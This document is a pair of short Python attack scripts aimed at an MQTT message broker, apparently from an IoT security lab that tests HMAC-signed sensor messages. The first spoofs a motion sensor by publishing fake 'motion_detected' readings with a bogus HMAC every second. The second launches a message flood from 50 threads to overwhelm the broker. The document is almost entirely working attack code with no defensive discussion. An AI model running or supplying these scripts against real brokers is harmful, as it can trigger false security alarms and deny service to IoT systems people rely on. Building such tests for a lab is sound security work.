# ✅ ATTACK 1: Spoofing - Fake sensor pretending to be legit
# spoof_attack.py
import json, time, paho.mqtt.client as mqtt
fake_msg = {
    "device_id": "sensor_motion_01",
    "sensor": "motion",
    "value": "motion_detected",
    "timestamp": time.strftime("%d/%b/%y %H:%M:%S"),
    "hmac": "00000000"  # invalid or fake
}
client = mqtt.Client()
client.connect("mqtt-broker", 1883)
client.loop_start()
while True:
    client.publish("filtered/zone1/motion", json.dumps(fake_msg))
    print("[SPOOF] Sent fake motion.")
    time.sleep(1)

# ✅ ATTACK 3: DDoS - Message Flood
# ddos_attack.py
import threading
import random

def flood():
    c = mqtt.Client()
    c.connect("mqtt-broker", 1883)
    while True:
        fake = {
            "device_id": f"flood_{random.randint(1000,9999)}",
            "sensor": "motion",
            "value": "motion_detected",
            "timestamp": time.strftime("%d/%b/%y %H:%M:%S"),
            "hmac": "0"*64
        }
        c.publish("filtered/zone1/motion", json.dumps(fake))
        time.sleep(0.1)
for _ in range(50):
    threading.Thread(target=flood).start()
